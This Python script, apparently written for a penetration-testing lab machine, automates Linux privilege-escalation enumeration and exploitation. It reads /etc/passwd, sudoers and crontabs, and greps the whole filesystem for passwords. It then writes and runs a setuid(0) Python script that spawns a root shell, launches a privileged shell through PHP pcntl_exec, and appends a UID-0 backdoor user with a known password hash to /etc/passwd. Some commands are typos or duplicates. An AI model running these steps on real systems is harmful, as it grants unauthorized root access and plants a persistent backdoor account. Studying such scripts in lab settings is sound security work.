#!/usr/bin/env python3

import subprocess
import sys

def run_command(command, check=False):
    print(f"\nExecuting: {command}")
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    print(result.stdout)
    if result.stderr:
        print(f"Error: {result.stderr}", file=sys.stderr)
    if check and result.returncode != 0:
        raise RuntimeError(f"Command failed: {command}")

def get_usernames():
    # Prompt the user for usernames
    usernames = input("Enter usernames separated by commas (or leave blank to skip): ")
    return [username.strip() for username in usernames.split(',') if username.strip()]

def check_user_home_directories(usernames):
    for username in usernames:
        user_home = f"/home/{username}"
        run_command(f"ls -lsa {user_home} 2>/dev/null", check=True)

def check_user_mail(usernames):
    for username in usernames:
        mail_file = f"/var/mail/{username}"
        run_command(f"cat {mail_file} 2>/dev/null", check=True)

def basic_directory_navigation_and_file_checks():
    directories = [
        '/', '/var/tmp', '/tmp', '/dev/shm', '/var/mail',
        '/var/spool/mail', '/var/www', '/opt', '/etc', '/srv/ftp'
    ]
    
    for directory in directories:
        run_command(f'ls -lah {directory} --color=auto 2>/dev/null')
    
    run_command("ls -lah /var/www/cgi-bin --color=auto 2>/dev/null")
    run_command("grep -iE '/bin/sh|/bin/bash' /etc/passwd --color=auto 2>/dev/null")
    run_command("cat /etc/stab 2>/dev/null")
    run_command("find / -name '*.secret' -ls 2>/dev/null")
    run_command("ls -lsa /etc/passwd --color=auto 2>/dev/null")
    run_command("ls -lsaR / --color=auto 2>/dev/null")
    run_command("cat /etc/stab 2>/dev/null")

def system_and_process_information():
    run_command('ps aux | grep -i "root" --color=auto 2>/dev/null')
    run_command('ls -lsa /etc/cron* --color=auto 2>/dev/null')
    run_command('cat /etc/crontab 2>/dev/null')
    run_command('ls /etc/cron.daily 2>/dev/null')
    run_command('file /bin/bash 2>/dev/null')
    run_command('netstat -antup 2>/dev/null')
    run_command('ss -tunlp 2>/dev/null')
    run_command('cat /etc/*-release 2>/dev/null')
    run_command('cat /etc/issue 2>/dev/null')
    run_command('netstat -antup | grep -i "127.0.0.1" --color=auto 2>/dev/null')
    run_command('dpkg -l | grep -i "mysql" --color=auto 2>/dev/null')
    run_command('cat /etc/sudoers 2>/dev/null')
    run_command('uname -a 2>/dev/null')

def searching_and_enumeration():
    run_command('grep -Ri "password" / --color=auto 2>/dev/null')
    run_command('cat /etc/fstab 2>/dev/null')
    run_command('mount 2>/dev/null')
    run_command('find / -perm -u=s -type f 2>/dev/null')
    run_command('find / -perm -g=s -type f 2>/dev/null')
    run_command('getcap -r / 2>/dev/null')
    run_command('file /bin/bash 2>/dev/null')

def advanced_enumeration():
    run_command('which gcc 2>/dev/null')
    run_command('which perl 2>/dev/null')
    run_command('cd /var/www/html/election && head index.php 2>/dev/null')
    run_command('cd /admin/inc && cat conn.php 2>/dev/null')
    run_command('ls -lsa /etc/cron-* --color=auto 2>/dev/null')
    run_command('crontab -u root -l 2>/dev/null')
    # Note: Ensure Pspy tool is installed and accessible
    run_command('pspy 2>/dev/null')  # Adjust based on actual tool usage
    run_command('getcap -r / 2>/dev/null')  # Looking for cap_setuid+ep with Python2.7

    # Creating and running a Python privilege escalation script
    with open('/var/tmp/offsec.py', 'w') as f:
        f.write('import os\n')
        f.write('os.setuid(0)\n')
        f.write('os.system("/bin/dash")\n')
    run_command('chmod +x /var/tmp/offsec.py 2>/dev/null')
    run_command('python2.7 /var/tmp/offsec.py 2>/dev/null')

def php_exploit():
    run_command('ls -lsa /usr/bin/php --color=auto 2>/dev/null')
    run_command('php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);" 2>/dev/null')

def user_addition_and_privilege_escalation():
    run_command('ls -lah /etc/passwd --color=auto 2>/dev/null')
    run_command('openssl passwd -1 i<3hacking 2>/dev/null')
    run_command("echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd 2>/dev/null", check=True)
    run_command('su - siren 2>/dev/null')
    run_command('id 2>/dev/null')

def main():
    print("Starting Linux Privilege Escalation Enumeration...\n")
    
    # Get usernames from the user
    usernames = get_usernames()
    
    # Execute the basic checks and directory navigation
    basic_directory_navigation_and_file_checks()
    system_and_process_information()
    searching_and_enumeration()
    advanced_enumeration()
    php_exploit()
    user_addition_and_privilege_escalation()
    
    # Check user home directories and mail if usernames are provided
    if usernames:
        check_user_home_directories(usernames)
        check_user_mail(usernames)
    
    print("Completed Linux Privilege Escalation Enumeration.\n")

if __name__ == '__main__':
    main()
